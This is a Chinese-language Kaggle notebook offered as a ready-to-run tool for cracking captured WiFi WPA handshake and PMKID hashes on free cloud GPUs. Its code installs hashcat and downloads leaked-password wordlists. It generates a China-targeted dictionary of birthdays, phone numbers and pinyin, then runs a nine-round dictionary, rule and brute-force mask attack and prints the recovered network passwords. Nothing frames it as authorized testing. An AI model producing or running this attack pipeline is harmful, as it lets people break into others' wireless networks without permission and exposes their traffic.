# WiFi握手包GPU破解 - Kaggle免费GPU加速 v2.0

**核心功能**: 直接粘贴hashline → 自动识别分割 → 批量GPU破解

**使用方法**:
1. 运行 Cell 1-2 安装环境和下载字典（首次约2分钟）
2. 在 Cell 3 的文本框中**直接粘贴**所有hashline（支持一次粘贴几十上百条）
3. 运行后续Cell，自动依次执行 **9轮攻击**

**字典规模（共计约 300万+ 条）**:

| 字典来源 | 条数 | 说明 |
|---------|------|------|
| wpa-sec 全球已破解 | ~75万 | 全球社区GPU破解的真实WiFi密码 |
| Probable-Wordlists WPA | ~20万 | 按概率排序的真实泄露密码（≥8位） |
| SecLists 10K常用 | ~1万 | 全球最常用密码Top10000 |
| 中国定制生成 | ~150万+ | 手机号/生日/拼音/吉利数字/键盘模式/强混合 |
| hashcat规则变异 | ×64倍 | best64规则对字典进行智能变异 |

**攻击策略（9轮递进）**:
```
攻击1: wpa-sec全球字典（~75万条）
攻击2: 中国定制字典（~150万条）
攻击3: Probable-Wordlists WPA字典（~20万条）
攻击4: 全部字典 + best64规则变异（×64倍扩展）
攻击5: 8位纯数字掩码（1亿组合）
攻击6: 常见前缀+数字（a/z/q + 7位数字）
攻击7: 9位纯数字掩码（10亿组合）
攻击8: 手机号模式（1开头+10位数字）
攻击9: 10位纯数字掩码（100亿，需要较长时间）
```

| GPU | WPA速度 | 8位数字 | 9位数字 |
|-----|---------|--------|--------|
| Kaggle T4 | ~80K H/s | ~20分钟 | ~3.5小时 |
| Kaggle P100 | ~120K H/s | ~14分钟 | ~2.3小时 |
| Mac M1 | ~52K H/s | ~32分钟 | ~5.3小时 |

## 1. 环境准备（GPU检测 + hashcat安装）

In [ ]:
# ============================================================================
# 环境准备：GPU检测 + hashcat安装
# 全部使用 ! magic命令，Kaggle原生支持，输出实时打印不会被内核中断
# ============================================================================

# ── GPU检测 ──
!echo "============================================================"
!echo "  GPU检测"
!echo "============================================================"
!nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null || echo "[!] GPU不可用"

# ── hashcat安装（检测预装 → 源码编译） ──
!echo ""
!echo "============================================================"
!echo "  hashcat安装"
!echo "============================================================"
!which hashcat > /dev/null 2>&1 && echo "[OK] hashcat已预装:" && hashcat --version || \
    (echo "从源码编译hashcat..." && \
     test -f /kaggle/working/hashcat-src/hashcat && echo "[OK] 已有编译产物" || \
     (git clone --depth=1 https://github.com/hashcat/hashcat.git /kaggle/working/hashcat-src 2>&1 | tail -3 && \
      cd /kaggle/working/hashcat-src && make -j4 2>&1 | tail -5 && echo "[OK] 编译完成"))

# ── 验证hashcat ──
!echo ""
!echo "  验证hashcat:"
!hashcat --version 2>/dev/null || /kaggle/working/hashcat-src/hashcat --version 2>/dev/null || echo "[!] hashcat不可用"

# ── 检测GPU设备 ──
!echo ""
!echo "  GPU设备检测:"
!(hashcat -I 2>/dev/null || /kaggle/working/hashcat-src/hashcat -I 2>/dev/null) | grep -E "Device|Name|Type" | head -4

!echo ""
!echo "  环境准备完成!"

## 2. 下载全网WiFi密码字典（300万+条）

In [ ]:
# ============================================================================
# 初始化Python变量 + 下载全网WiFi密码字典 + 生成中国定制字典
# ============================================================================
import os, subprocess, glob, time, sys, re

WORK_DIR = '/kaggle/working'
DICT_DIR = os.path.join(WORK_DIR, 'dicts')
os.makedirs(DICT_DIR, exist_ok=True)

# ── 设置HASHCAT_BIN（检测哪个hashcat可用） ──
HASHCAT_BIN = 'hashcat'
for candidate in ['hashcat', os.path.join(WORK_DIR, 'hashcat-src', 'hashcat')]:
    try:
        r = subprocess.run([candidate, '--version'], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            HASHCAT_BIN = candidate
            break
    except Exception:
        continue
print(f'  hashcat: {HASHCAT_BIN}')

# ── 字典下载函数 ──
def download_dict(url, save_path, desc):
    if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
        print(f'  [已存在] {desc}: {lines:,} 条')
        return True
    print(f'  [下载中] {desc}...')
    try:
        if url.endswith('.gz'):
            tmp = save_path + '.gz'
            subprocess.run(['wget','-q','--timeout=30',url,'-O',tmp], timeout=120)
            subprocess.run(['gunzip','-f',tmp], capture_output=True)
        else:
            subprocess.run(['wget','-q','--timeout=60',url,'-O',save_path], timeout=300)
        if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
            lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
            print(f'  [完成] {desc}: {lines:,} 条')
            return True
    except Exception as e:
        print(f'  [失败] {desc}: {e}')
    return False

print('='*60)
print('  字典下载')
print('='*60)

DICT_WPASEC = os.path.join(DICT_DIR, 'wpa-sec-cracked.txt')
download_dict('https://wpa-sec.stanev.org/dict/cracked.txt.gz',
              DICT_WPASEC, 'wpa-sec全球已破解WiFi密码（~75万条）')

DICT_PROBABLE = os.path.join(DICT_DIR, 'probable-wpa.txt')
download_dict('https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt',
              DICT_PROBABLE, 'Probable-Wordlists WPA（~20万条）')

DICT_SECLISTS = os.path.join(DICT_DIR, 'seclists-10k.txt')
download_dict('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt',
              DICT_SECLISTS, 'SecLists Top10000')

DICT_XATO = os.path.join(DICT_DIR, 'xato-10m.txt')
download_dict('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt',
              DICT_XATO, 'SecLists xato 1000万密码')

# ── 中国定制字典（流式生成） ──
DICT_CHINA = os.path.join(DICT_DIR, 'china-wifi-mega.txt')

def generate_china_dict(outpath):
    seen = set()
    count = [0]
    with open(outpath, 'w') as fout:
        def add(s):
            if len(s) >= 8 and s not in seen:
                seen.add(s)
                fout.write(s + '\n')
                count[0] += 1

        # 8位数字高频
        for d in '0123456789':
            add(d*8); add(d*9); add(d*10)
        for start in range(10):
            add(''.join(str((start+i)%10) for i in range(8)))
            add(''.join(str((start-i)%10) for i in range(8)))
        for a in range(10):
            for b in range(10):
                for c in range(10):
                    for d in range(10):
                        add(f'{a}{a}{b}{b}{c}{c}{d}{d}')
        for n in range(10000):
            s = f'{n:04d}'; add(s+s); add(s+s[::-1])
        for n in range(100):
            add(f'{n:02d}'*4)
        # 生日
        for y in range(1960, 2012):
            for m in range(1, 13):
                for d in range(1, 32):
                    if m in (4,6,9,11) and d>30: continue
                    if m==2 and d>29: continue
                    add(f'{y:04d}{m:02d}{d:02d}')
                    add(f'{m:02d}{d:02d}{y:04d}')
                    add(f'{d:02d}{m:02d}{y:04d}')
        # 情感数字
        for i in range(100000):
            add(f'520{i:05d}'); add(f'{i:05d}520')
        for i in range(10000):
            add(f'1314{i:04d}'); add(f'{i:04d}1314')
        for a in ['520','1314','5201314','1314520','5200','8888','6666','9999']:
            for b in ['520','1314','5201314','1314520','5200','8888','6666','9999']:
                add(a+b)
        # 拼音+数字
        for py in ['woaini','nihao','mima','baobei','laogong','laopo','kuaile',
                    'shouji','wechat','weixin','taobao','jiayou','xingfu',
                    'xiaoming','wangjun','zhangwei','liming','woaiwo']:
            for sfx in ['123','1234','12345','123456','12345678','888','666',
                        '520','1314','0000','9999','2024','2025','2026']:
                add(py+sfx); add(py.capitalize()+sfx)
        # 字母+数字
        for c in 'abcdefghijklmnopqrstuvwxyz':
            for num in ['1234567','12345678','123456789','11111111','88888888',
                        '00000000','66666666','12341234','87654321']:
                add(c+num); add(num+c)
        for c1 in 'abcdefghijklmnopqrstuvwxyz':
            for c2 in 'abcdefghijklmnopqrstuvwxyz':
                for num in ['123456','1234567','888888','666666']:
                    add(c1+c2+num)
        # 4位模式组合
        p4 = ['0000','1111','2222','3333','4444','5555','6666','7777',
              '8888','9999','1234','5678','9012','1314','0520','5201']
        for p1 in p4:
            for p2 in p4: add(p1+p2)
            for n in range(10000): add(p1+f'{n:04d}')
        # 键盘+路由器+弱密码
        for p in ['qwertyui','asdfghjk','1qaz2wsx','q1w2e3r4','qwer1234',
                  'admin1234','tplink1234','password1','huawei1234','wifi12345']:
            if len(p)>=8: add(p)
    return count[0]

if os.path.exists(DICT_CHINA) and os.path.getsize(DICT_CHINA) > 1000:
    lines = int(subprocess.getoutput(f'wc -l < {DICT_CHINA}').strip() or 0)
    print(f'  [已存在] 中国定制字典: {lines:,} 条')
else:
    print('  [生成中] 中国定制字典...')
    total = generate_china_dict(DICT_CHINA)
    print(f'  [完成] 中国定制字典: {total:,} 条')

# ── 汇总 ──
print()
total_lines = 0
all_dicts = []
for name, path in [('wpa-sec', DICT_WPASEC), ('中国定制', DICT_CHINA),
                    ('Probable', DICT_PROBABLE), ('SecLists', DICT_SECLISTS),
                    ('xato 10M', DICT_XATO)]:
    if os.path.exists(path) and os.path.getsize(path) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {path}').strip() or 0)
        mb = os.path.getsize(path)/1024/1024
        print(f'  {name:15s} {lines:>10,} 条 ({mb:.1f}MB)')
        total_lines += lines
        all_dicts.append(path)
print(f'  合计: {total_lines:,} 条, {len(all_dicts)} 个字典')

## 3. 粘贴握手包hashline（自动分割识别）

**直接在下方代码的 `RAW_PASTE` 变量中粘贴所有hashline**

支持的格式：
- 一次粘贴多条，每行一条
- 混合粘贴PMKID和EAPoL握手包
- 自动过滤空行、注释行、无效行
- 自动去重

**hashline格式示例**：
```
WPA*01*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码
WPA*02*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码*...
```

In [ ]:
# ============================================================================
# 握手包加载：直接粘贴hashline，自动分割识别，批量加载
# ============================================================================

# ╔══════════════════════════════════════════════════════════════════╗
# ║  在下方三引号中直接粘贴所有hashline（支持一次粘贴几十上百条）   ║
# ║  每行一条，自动过滤空行/注释行/无效行，自动去重               ║
# ╚══════════════════════════════════════════════════════════════════╝
RAW_PASTE = """
在这里粘贴你的hashline，直接全选粘贴即可，例如：
WPA*02*69e21d657728f8545fd4ad1e9c50104a*a4ba70041a7e*3c58c255c0a3*5869616f6d695f41333830*20ac33f59f48af4fb5d120c327cabb2acff086a03d61eec55ec0331dcdad495c*0103007702010a0000000000000000000364580f3fd111864bcf8fa6b8c3b56a3ea365a90a1233565a7819189de7ca04b5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001830160100000fac040100000fac040100000fac023c000000*00
"""

# ============================================================================
# 自动分割识别引擎
# ============================================================================
def parse_hashlines(raw_text):
    """
    智能解析粘贴的hashline文本
    支持：多行粘贴、混合格式、自动清洗
    返回：去重后的有效hashline列表 + 解析报告
    """
    seen = set()
    valid = []
    invalid_count = 0
    duplicate_count = 0
    
    # 按行分割（支持\n \r\n \r）
    lines = re.split(r'[\r\n]+', raw_text)
    
    for line in lines:
        line = line.strip()
        
        # 跳过空行
        if not line:
            continue
        # 跳过注释行
        if line.startswith('#') or line.startswith('//') or line.startswith('在这里'):
            continue
        
        # 提取WPA*开头的hashline（一行中可能有多条用空格分隔）
        # 也处理行内可能有制表符或多空格的情况
        segments = re.split(r'[\t ]+', line)
        for seg in segments:
            seg = seg.strip()
            if not seg.startswith('WPA*'):
                continue
            
            # 验证基本格式：WPA*类型*...至少6个*分隔字段
            parts = seg.split('*')
            if len(parts) < 6:
                invalid_count += 1
                continue
            
            # 验证类型字段：01=PMKID, 02=EAPoL
            if parts[1] not in ('01', '02'):
                invalid_count += 1
                continue
            
            # 去重（用完整hashline作为key）
            if seg in seen:
                duplicate_count += 1
                continue
            
            seen.add(seg)
            valid.append(seg)
    
    return valid, invalid_count, duplicate_count

# 执行解析
hashlines, n_invalid, n_dup = parse_hashlines(RAW_PASTE)

# 同时扫描Kaggle Dataset中的.22000文件
dataset_lines = []
for search_dir in ['/kaggle/input', '/kaggle/working']:
    for ext in ['*.22000', '*.hc22000']:
        for fpath in glob.glob(f'{search_dir}/**/{ext}', recursive=True):
            with open(fpath) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('WPA*') and line not in set(hashlines):
                        dataset_lines.append(line)

# 合并所有来源
all_hashlines = hashlines + dataset_lines

# 写入合并文件
ALL_HASHES = os.path.join(WORK_DIR, 'all_hashes.22000')
with open(ALL_HASHES, 'w') as out:
    for h in all_hashlines:
        out.write(h + '\n')

# ── 解析并展示目标信息 ──
print('='*60)
print('  握手包加载报告')
print('='*60)
print(f'  粘贴解析: {len(hashlines)} 条有效'
      f'{f", {n_dup} 条重复已去除" if n_dup else ""}'
      f'{f", {n_invalid} 条无效已过滤" if n_invalid else ""}')
if dataset_lines:
    print(f'  Dataset扫描: {len(dataset_lines)} 条（来自.22000文件）')
print(f'  合计加载: {len(all_hashlines)} 个WiFi握手包哈希')
print()

# 详细列表
pmkid_count = 0
eapol_count = 0
if all_hashlines:
    print(f'  {"#":>4s}  {"SSID":<28s}  {"BSSID":<19s}  {"类型":<10s}')
    print(f'  {"─"*4}  {"─"*28}  {"─"*19}  {"─"*10}')
    for idx, h in enumerate(all_hashlines):
        parts = h.split('*')
        if len(parts) >= 6:
            htype = 'PMKID' if parts[1] == '01' else 'EAPoL握手'
            if parts[1] == '01': pmkid_count += 1
            else: eapol_count += 1
            try:
                ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
            except:
                ssid = parts[5][:28]
            mac_raw = parts[3] if len(parts[3]) >= 12 else '000000000000'
            mac_ap = ':'.join(mac_raw[j:j+2] for j in range(0, 12, 2))
            print(f'  {idx+1:>4d}  {ssid:<28s}  {mac_ap:<19s}  {htype}')
    print()
    print(f'  PMKID: {pmkid_count} 个 | EAPoL握手: {eapol_count} 个')
else:
    print('  [!] 未找到任何握手包！')
    print('  [!] 请在上方 RAW_PASTE 变量中粘贴hashline后重新运行此Cell')

## 4. hashcat GPU批量破解（9轮递进攻击）

In [ ]:
# ============================================================================
# hashcat GPU批量破解：9轮递进攻击
# 字典攻击 → 规则变异 → 掩码暴力（从快到慢）
# ============================================================================

OUTFILE = os.path.join(WORK_DIR, 'cracked_passwords.txt')
POTFILE = os.path.join(WORK_DIR, 'hashcat.potfile')

# 清理旧结果
for f in [OUTFILE, POTFILE]:
    if os.path.exists(f):
        os.remove(f)

def run_hashcat(attack_name, extra_args, timeout_sec=7200):
    """运行hashcat单轮攻击，使用HASHCAT_BIN变量"""
    print(f'\n{"="*60}')
    print(f'  {attack_name}')
    print(f'{"="*60}')
    
    cmd = [
        HASHCAT_BIN, '-m', '22000',
        ALL_HASHES,
        '--potfile-path', POTFILE,
        '--outfile', OUTFILE,
        '--outfile-format', '2',
        '-w', '3',
        '-O',
        '--quiet',
    ] + extra_args
    
    start_time = time.time()
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        output = result.stdout + result.stderr
        elapsed = time.time() - start_time
    except subprocess.TimeoutExpired:
        elapsed = time.time() - start_time
        print(f'  [!] 超时（{timeout_sec//60}分钟），跳过')
        print(f'  耗时: {elapsed:.0f}秒')
        return False, 0
    except FileNotFoundError:
        print(f'  [!] hashcat未找到: {HASHCAT_BIN}')
        return False, 0
    
    # 提取关键信息
    for line in output.split('\n'):
        line_s = line.strip()
        if any(kw in line_s for kw in ['Speed', 'Recovered', 'Progress', 'Candidates']):
            print(f'  {line_s}')
    
    print(f'  耗时: {elapsed:.1f}秒')
    
    # 统计已破解数
    cracked_n = 0
    if os.path.exists(POTFILE):
        with open(POTFILE) as f:
            cracked_n = sum(1 for _ in f)
    
    # hashcat返回码: 0=至少破解一个, 1=全部穷尽未破解
    if result.returncode == 0 or 'Cracked' in output:
        if 'All hashes found' in output:
            print(f'  >>> 全部 {len(all_hashlines)} 个握手包已破解! <<<')
            return True, cracked_n
        print(f'  >>> 发现密码! (已破解 {cracked_n} 个) <<<')
        return False, cracked_n
    
    return False, cracked_n

def merge_dicts(dict_list, output_path):
    """合并多个字典文件并去重"""
    seen = set()
    with open(output_path, 'w') as fout:
        for dp in dict_list:
            if os.path.exists(dp):
                with open(dp) as fin:
                    for line in fin:
                        line = line.strip()
                        if line and line not in seen:
                            seen.add(line)
                            fout.write(line + '\n')
    return len(seen)

def show_progress():
    """显示当前破解进度"""
    if not os.path.exists(POTFILE):
        return
    with open(POTFILE) as f:
        n = sum(1 for _ in f)
    if n > 0:
        print(f'\n  ── 当前进度: {n}/{len(all_hashlines)} 个已破解 ──')

# ============================================================================
# 开始9轮递进攻击
# ============================================================================
print('='*60)
print(f'  开始批量破解 {len(all_hashlines)} 个WiFi握手包')
print(f'  hashcat路径: {HASHCAT_BIN}')
print(f'  攻击策略: 字典(4轮) → 掩码暴力(5轮)')
print('='*60)

attack_start = time.time()
all_done = False

# ── 攻击1: wpa-sec全球已破解字典 ──
if not all_done and os.path.exists(DICT_WPASEC):
    all_done, _ = run_hashcat(
        '攻击1/9: wpa-sec全球已破解WiFi密码（~75万条）',
        ['-a', '0', DICT_WPASEC])
    show_progress()

# ── 攻击2: 中国定制强密码字典 ──
if not all_done and os.path.exists(DICT_CHINA):
    all_done, _ = run_hashcat(
        '攻击2/9: 中国定制强密码混合字典（~150万条）',
        ['-a', '0', DICT_CHINA])
    show_progress()

# ── 攻击3: Probable + SecLists + xato 合并字典 ──
if not all_done:
    extra = [d for d in [DICT_PROBABLE, DICT_SECLISTS, DICT_XATO] if os.path.exists(d)]
    if extra:
        merged = os.path.join(WORK_DIR, 'merged_extra.txt')
        n_merged = merge_dicts(extra, merged)
        all_done, _ = run_hashcat(
            f'攻击3/9: Probable+SecLists+xato合并字典（{n_merged:,}条）',
            ['-a', '0', merged])
        show_progress()

# ── 攻击4: 全部字典 + best64规则变异 ──
if not all_done:
    all_merged = os.path.join(WORK_DIR, 'all_merged.txt')
    existing = [d for d in all_dicts if os.path.exists(d)]
    if existing:
        n_all = merge_dicts(existing, all_merged)
        # 查找best64规则文件（hashcat源码编译后在当前目录/rules/）
        rule_file = ''
        rule_paths = [
            '/usr/share/hashcat/rules/best64.rule',
            '/usr/local/share/hashcat/rules/best64.rule',
            os.path.join(WORK_DIR, 'hashcat-src', 'rules', 'best64.rule'),
        ]
        for rp in rule_paths:
            if os.path.exists(rp):
                rule_file = rp
                break
        if rule_file:
            all_done, _ = run_hashcat(
                f'攻击4/9: 全字典({n_all:,}条)+best64规则变异（×64倍）',
                ['-a', '0', all_merged, '-r', rule_file],
                timeout_sec=3600)
        else:
            print('\n  [!] 未找到best64.rule，跳过规则变异攻击')
        show_progress()

# ── 攻击5: 8位纯数字掩码 ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击5/9: 8位纯数字掩码（1亿组合）',
        ['-a', '3', '?d?d?d?d?d?d?d?d'])
    show_progress()

# ── 攻击6: 字母前缀+7位数字掩码 ──
if not all_done:
    mask_file = os.path.join(WORK_DIR, 'prefix_masks.hcmask')
    with open(mask_file, 'w') as f:
        for c in 'aqzwsxedcrfvtgbyhnujm':
            f.write(f'{c}?d?d?d?d?d?d?d\n')
            f.write(f'{c.upper()}?d?d?d?d?d?d?d\n')
    all_done, _ = run_hashcat(
        '攻击6/9: 字母前缀+7位数字掩码（中国常见模式）',
        ['-a', '3', mask_file], timeout_sec=3600)
    show_progress()

# ── 攻击7: 9位纯数字掩码 ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击7/9: 9位纯数字掩码（10亿组合）',
        ['-a', '3', '?d?d?d?d?d?d?d?d?d'], timeout_sec=14400)
    show_progress()

# ── 攻击8: 手机号模式 ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击8/9: 手机号模式（1+10位数字）',
        ['-a', '3', '1?d?d?d?d?d?d?d?d?d?d'], timeout_sec=14400)
    show_progress()

# ── 攻击9: 10位纯数字 ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击9/9: 10位纯数字掩码（100亿组合）',
        ['-a', '3', '?d?d?d?d?d?d?d?d?d?d'], timeout_sec=21600)

# ── 汇总 ──
total_elapsed = time.time() - attack_start
print(f'\n{"="*60}')
print(f'  全部9轮攻击完成，总耗时: {total_elapsed/60:.1f}分钟')
print(f'{"="*60}')

## 5. 查看破解结果

In [ ]:
# ============================================================================
# 破解结果展示
# ============================================================================

print('='*60)
print('  WiFi握手包GPU破解结果')
print('='*60)
print()

# 从potfile读取结果（格式：完整hashline:password）
cracked = []
if os.path.exists(POTFILE):
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.rsplit(':', 1)
                if len(parts) == 2:
                    hash_part = parts[0]
                    password = parts[1]
                    hp = hash_part.split('*')
                    ssid = ''
                    bssid = ''
                    htype = ''
                    if len(hp) >= 6:
                        htype = 'PMKID' if hp[1] == '01' else 'EAPoL'
                        try:
                            ssid = bytes.fromhex(hp[5]).decode('utf-8', errors='replace')
                        except:
                            ssid = hp[5]
                        if len(hp[3]) >= 12:
                            bssid = ':'.join(hp[3][j:j+2] for j in range(0, 12, 2))
                    cracked.append({
                        'ssid': ssid, 'password': password,
                        'bssid': bssid, 'type': htype
                    })

if cracked:
    print(f'  成功破解 {len(cracked)}/{len(all_hashlines)} 个WiFi密码!\n')
    print(f'  {"#":>4s}  {"SSID":<24s}  {"密码":<20s}  {"BSSID":<19s}  {"类型"}')
    print(f'  {"─"*4}  {"─"*24}  {"─"*20}  {"─"*19}  {"─"*6}')
    for i, c in enumerate(cracked):
        print(f'  {i+1:>4d}  {c["ssid"]:<24s}  {c["password"]:<20s}  {c["bssid"]:<19s}  {c["type"]}')
    
    print(f'\n  {"="*40}')
    print(f'  密码汇总（方便复制）:')
    print(f'  {"="*40}')
    for c in cracked:
        print(f'  {c["ssid"]}: {c["password"]}')
    
    uncracked = len(all_hashlines) - len(cracked)
    if uncracked > 0:
        print(f'\n  [!] 还有 {uncracked} 个未破解')
else:
    print('  未破解任何密码。\n')
    print('  可能原因:')
    print('    - 密码是强密码（字母+数字+符号混合且较长）')
    print('    - 握手包数据不完整或损坏')
    print('  建议:')
    print('    - 重新捕获握手包（确保完整四次握手或PMKID）')
    print('    - 对于中文SSID路由器，密码大概率是8位纯数字（攻击5已覆盖）')

# hashcat --show 原始输出
print(f'\n{"="*60}')
print('  hashcat --show 原始输出')
print(f'{"="*60}')
r = subprocess.run([HASHCAT_BIN, '-m', '22000', ALL_HASHES,
                    '--potfile-path', POTFILE, '--show'],
                   capture_output=True, text=True, timeout=30)
print(r.stdout if r.stdout else '  无结果')
if r.stderr:
    print(f'  {r.stderr.strip()[:200]}')